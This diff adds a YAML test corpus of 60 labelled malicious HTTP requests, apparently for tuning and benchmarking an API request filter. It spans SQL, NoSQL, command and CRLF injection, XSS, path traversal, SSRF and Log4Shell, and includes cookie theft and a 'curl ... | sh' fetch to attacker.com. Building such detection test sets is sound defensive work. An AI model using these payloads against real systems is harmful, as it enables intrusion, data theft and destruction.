@@ -1,0 +1,572 @@
+# API Gatekeeper — Development Attack Corpus (60 cases)
+# Used for rule tuning and development benchmarks.
+
+# ── SQL Injection (12 cases) ────────────────────────────────────────────────
+- id: sqli-dev-001
+  category: sqli
+  label: attack
+  method: GET
+  path: /api/products
+  query: "search=' UNION SELECT 1,2,3,4--"
+  body: null
+  headers: {}
+
+- id: sqli-dev-002
+  category: sqli
+  label: attack
+  method: GET
+  path: /api/products
+  query: "search=1' OR 1=1--"
+  body: null
+  headers: {}
+
+- id: sqli-dev-003
+  category: sqli
+  label: attack
+  method: POST
+  path: /api/products
+  query: ""
+  body: '{"name": "test", "category": "books''; DROP TABLE products;--"}'
+  headers:
+    content-type: application/json
+
+- id: sqli-dev-004
+  category: sqli
+  label: attack
+  method: GET
+  path: /api/products
+  query: "id=1' AND 'a'='a"
+  body: null
+  headers: {}
+
+- id: sqli-dev-005
+  category: sqli
+  label: attack
+  method: GET
+  path: /api/products
+  query: "search=1' UNION ALL SELECT null,username,password FROM users--"
+  body: null
+  headers: {}
+
+- id: sqli-dev-006
+  category: sqli
+  label: attack
+  method: GET
+  path: /api/products
+  query: "filter=1; EXEC xp_cmdshell('dir')"
+  body: null
+  headers: {}
+
+- id: sqli-dev-007
+  category: sqli
+  label: attack
+  method: GET
+  path: /api/products
+  query: "search=admin' OR 100=100#"
+  body: null
+  headers: {}
+
+- id: sqli-dev-008
+  category: sqli
+  label: attack
+  method: GET
+  path: /api/products
+  query: "search=%27%20UNION%20SELECT%201%2C2%2C3--"
+  body: null
+  headers: {}
+
+- id: sqli-dev-009
+  category: sqli
+  label: attack
+  method: GET
+  path: /api/products
+  query: "search=uNiOn/**/sElEcT/**/1,2,3"
+  body: null
+  headers: {}
+
+- id: sqli-dev-010
+  category: sqli
+  label: attack
+  method: GET
+  path: /api/products
+  query: "id=5' OR 'x'='x'--"
+  body: null
+  headers: {}
+
+- id: sqli-dev-011
+  category: sqli
+  label: attack
+  method: GET
+  path: /api/products
+  query: "search=item'; ALTER TABLE users ADD COLUMN pwned int;--"
+  body: null
+  headers: {}
+
+- id: sqli-dev-012
+  category: sqli
+  label: attack
+  method: GET
+  path: /api/products
+  query: "category=shoes' UNION SELECT null,table_name FROM information_schema.tables--"
+  body: null
+  headers: {}
+
+# ── Cross-Site Scripting (10 cases) ─────────────────────────────────────────
+- id: xss-dev-001
+  category: xss
+  label: attack
+  method: GET
+  path: /api/products
+  query: "search=<script>alert('xss')</script>"
+  body: null
+  headers: {}
+
+- id: xss-dev-002
+  category: xss
+  label: attack
+  method: POST
+  path: /api/feedback
+  query: ""
+  body: '{"product_id": 1, "comment": "<img src=x onerror=alert(document.cookie)>"}'
+  headers:
+    content-type: application/json
+
+- id: xss-dev-003
+  category: xss
+  label: attack
+  method: GET
+  path: /api/products
+  query: "redirect=javascript:alert(1)"
+  body: null
+  headers: {}
+
+- id: xss-dev-004
+  category: xss
+  label: attack
+  method: POST
+  path: /api/feedback
+  query: ""
+  body: '{"comment": "<svg/onload=fetch(`http://attacker.com/?`+document.cookie)>"}'
+  headers:
+    content-type: application/json
+
+- id: xss-dev-005
+  category: xss
+  label: attack
+  method: GET
+  path: /api/products
+  query: "search=%3Cscript%3Econfirm(1)%3C%2Fscript%3E"
+  body: null
+  headers: {}
+
+- id: xss-dev-006
+  category: xss
+  label: attack
+  method: POST
+  path: /api/feedback
+  query: ""
+  body: '{"comment": "<body onload=alert(1)>"}'
+  headers:
+    content-type: application/json
+
+- id: xss-dev-007
+  category: xss
+  label: attack
+  method: GET
+  path: /api/products
+  query: "name=<iframe src=\"javascript:alert(1)\">"
+  body: null
+  headers: {}
+
+- id: xss-dev-008
+  category: xss
+  label: attack
+  method: POST
+  path: /api/feedback
+  query: ""
+  body: '{"comment": "<input type=\"text\" autofocus onfocus=\"alert(1)\">"}'
+  headers:
+    content-type: application/json
+
+- id: xss-dev-009
+  category: xss
+  label: attack
+  method: GET
+  path: /api/products
+  query: "search=&lt;script&gt;alert(1)&lt;/script&gt;"
+  body: null
+  headers: {}
+
+- id: xss-dev-010
+  category: xss
+  label: attack
+  method: POST
+  path: /api/feedback
+  query: ""
+  body: '{"comment": "hello<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>"}'
+  headers:
+    content-type: application/json
+
+# ── Command Injection (8 cases) ─────────────────────────────────────────────
+- id: cmdi-dev-001
+  category: cmdi
+  label: attack
+  method: GET
+  path: /api/products
+  query: "file=test.txt; cat /etc/passwd"
+  body: null
+  headers: {}
+
+- id: cmdi-dev-002
+  category: cmdi
+  label: attack
+  method: GET
+  path: /api/products
+  query: "host=127.0.0.1 && whoami"
+  body: null
+  headers: {}
+
+- id: cmdi-dev-003
+  category: cmdi
+  label: attack
+  method: POST
+  path: /api/products
+  query: ""
+  body: '{"name": "report", "format": "pdf | id"}'
+  headers:
+    content-type: application/json
+
+- id: cmdi-dev-004
+  category: cmdi
+  label: attack
+  method: GET
+  path: /api/products
+  query: "ip=127.0.0.1; ping -c 3 8.8.8.8"
+  body: null
+  headers: {}
+
+- id: cmdi-dev-005
+  category: cmdi
+  label: attack
+  method: GET
+  path: /api/products
+  query: "query=test$(whoami)"
+  body: null
+  headers: {}
+
+- id: cmdi-dev-006
+  category: cmdi
+  label: attack
+  method: GET
+  path: /api/products
+  query: "target=`uname -a`"
+  body: null
+  headers: {}
+
+- id: cmdi-dev-007
+  category: cmdi
+  label: attack
+  method: GET
+  path: /api/products
+  query: "domain=example.com; curl http://attacker.com/malware.sh | sh"
+  body: null
+  headers: {}
+
+- id: cmdi-dev-008
+  category: cmdi
+  label: attack
+  method: POST
+  path: /api/feedback
+  query: ""
+  body: '{"comment": "backup && rm -rf /tmp/test"}'
+  headers:
+    content-type: application/json
+
+# ── NoSQL Injection (6 cases) ───────────────────────────────────────────────
+- id: nosql-dev-001
+  category: nosql
+  label: attack
+  method: POST
+  path: /api/auth/login
+  query: ""
+  body: '{"username": {"$ne": null}, "password": {"$ne": null}}'
+  headers:
+    content-type: application/json
+
+- id: nosql-dev-002
+  category: nosql
+  label: attack
+  method: GET
+  path: /api/products
+  query: "category[$gt]="
+  body: null
+  headers: {}
+
+- id: nosql-dev-003
+  category: nosql
+  label: attack
+  method: POST
+  path: /api/auth/login
+  query: ""
+  body: '{"username": "admin", "password": {"$regex": "^admin.*"}}'
+  headers:
+    content-type: application/json
+
+- id: nosql-dev-004
+  category: nosql
+  label: attack
+  method: POST
+  path: /api/products
+  query: ""
+  body: '{"filter": {"$where": "this.password.length > 0"}}'
+  headers:
+    content-type: application/json
+
+- id: nosql-dev-005
+  category: nosql
+  label: attack
+  method: GET
+  path: /api/products
+  query: "price[$gte]=0&name[$exists]=true"
+  body: null
+  headers: {}
+
+- id: nosql-dev-006
+  category: nosql
+  label: attack
+  method: POST
+  path: /api/auth/login
+  query: ""
+  body: '{"$or": [{"username": "admin"}, {"username": "root"}]}'
+  headers:
+    content-type: application/json
+
+# ── Path Traversal (6 cases) ────────────────────────────────────────────────
+- id: trav-dev-001
+  category: traversal
+  label: attack
+  method: GET
+  path: /api/products
+  query: "file=../../../../etc/passwd"
+  body: null
+  headers: {}
+
+- id: trav-dev-002
+  category: traversal
+  label: attack
+  method: GET
+  path: /api/static/../../../../windows/win.ini
+  query: ""
+  body: null
+  headers: {}
+
+- id: trav-dev-003
+  category: traversal
+  label: attack
+  method: GET
+  path: /api/products
+  query: "doc=..%2f..%2f..%2fetc%2fshadow"
+  body: null
+  headers: {}
+
+- id: trav-dev-004
+  category: traversal
+  label: attack
+  method: GET
+  path: /api/download
+  query: "path=images/../../../etc/hosts"
+  body: null
+  headers: {}
+
+- id: trav-dev-005
+  category: traversal
+  label: attack
+  method: GET
+  path: /api/products
+  query: "template=..\\..\\..\\boot.ini"
+  body: null
+  headers: {}
+
+- id: trav-dev-006
+  category: traversal
+  label: attack
+  method: GET
+  path: /api/view/..%252f..%252f..%252fetc%252fpasswd
+  query: ""
+  body: null
+  headers: {}
+
+# ── Server-Side Request Forgery (6 cases) ───────────────────────────────────
+- id: ssrf-dev-001
+  category: ssrf
+  label: attack
+  method: GET
+  path: /api/products
+  query: "url=http://169.254.169.254/latest/meta-data/"
+  body: null
+  headers: {}
+
+- id: ssrf-dev-002
+  category: ssrf
+  label: attack
+  method: POST
+  path: /api/webhook
+  query: ""
+  body: '{"webhook_url": "http://127.0.0.1:8080/admin/dump"}'
+  headers:
+    content-type: application/json
+
+- id: ssrf-dev-003
+  category: ssrf
+  label: attack
+  method: GET
+  path: /api/fetch
+  query: "target=http://10.0.0.1/private/keys"
+  body: null
+  headers: {}
+
+- id: ssrf-dev-004
+  category: ssrf
+  label: attack
+  method: GET
+  path: /api/proxy
+  query: "destination=http://192.168.1.1/router-status"
+  body: null
+  headers: {}
+
+- id: ssrf-dev-005
+  category: ssrf
+  label: attack
+  method: GET
+  path: /api/image
+  query: "url=http://metadata.google.internal/computeMetadata/v1/"
+  body: null
+  headers: {}
+
+- id: ssrf-dev-006
+  category: ssrf
+  label: attack
+  method: POST
+  path: /api/feedback
+  query: ""
+  body: '{"avatar": "http://0.0.0.0:22/banner"}'
+  headers:
+    content-type: application/json
+
+# ── Log4Shell / JNDI (4 cases) ──────────────────────────────────────────────
+- id: jndi-dev-001
+  category: jndi
+  label: attack
+  method: GET
+  path: /api/products
+  query: "search=${jndi:ldap://attacker.com/exploit}"
+  body: null
+  headers: {}
+
+- id: jndi-dev-002
+  category: jndi
+  label: attack
+  method: POST
+  path: /api/feedback
+  query: ""
+  body: '{"comment": "${jndi:rmi://10.0.0.5:1099/obj}"}'
+  headers:
+    content-type: application/json
+
+- id: jndi-dev-003
+  category: jndi
+  label: attack
+  method: GET
+  path: /api/health
+  query: ""
+  body: null
+  headers:
+    user-agent: "${jndi:dns://attacker.com/leak}"
+
+- id: jndi-dev-004
+  category: jndi
+  label: attack
+  method: GET
+  path: /api/products
+  query: "ref=${${lower:j}ndi:ldap://evil.corp/payload}"
+  body: null
+  headers: {}
+
+# ── Scanner / Bot User-Agents (4 cases) ─────────────────────────────────────
+- id: bot-dev-001
+  category: bot
+  label: attack
+  method: GET
+  path: /api/products
+  query: "search=' UNION SELECT 1,2,3--"
+  body: null
+  headers:
+    user-agent: "sqlmap/1.5.2#stable (http://sqlmap.org)"
+
+- id: bot-dev-002
+  category: bot
+  label: attack
+  method: GET
+  path: /api/admin
+  query: "search=1' OR 1=1--"
+  body: null
+  headers:
+    user-agent: "Mozilla/5.0 (Nikto/2.1.6)"
+
+- id: bot-dev-003
+  category: bot
+  label: attack
+  method: GET
+  path: /api/login
+  query: "cmd=; whoami"
+  body: null
+  headers:
+    user-agent: "Nuclei - Open-source vulnerability scanner"
+
+- id: bot-dev-004
+  category: bot
+  label: attack
+  method: GET
+  path: /api/products
+  query: "path=../../../../etc/passwd"
+  body: null
+  headers:
+    user-agent: "Nmap Scripting Engine (https://nmap.org/book/nse.html)"
+
+# ── Protocol Manipulation / CRLF Injection (4 cases) ────────────────────────
+- id: proto-dev-001
+  category: protocol
+  label: attack
+  method: GET
+  path: /api/products
+  query: "lang=en%0d%0aSet-Cookie:admin=true"
+  body: null
+  headers: {}
+
+- id: proto-dev-002
+  category: protocol
+  label: attack
+  method: GET
+  path: /api/redirect
+  query: "url=test%0d%0aLocation:http://evil.com"
+  body: null
+  headers: {}
+
+- id: proto-dev-003
+  category: protocol
+  label: attack
+  method: POST
+  path: /api/feedback
+  query: ""
+  body: '{"header": "value\r\nX-Injected-Header: injected"}'
+  headers:
+    content-type: application/json
+
+- id: proto-dev-004
+  category: protocol
+  label: attack
+  method: GET
+  path: /api/products
+  query: "page=1%0a%0dContent-Length:0"
+  body: null
+  headers: {}
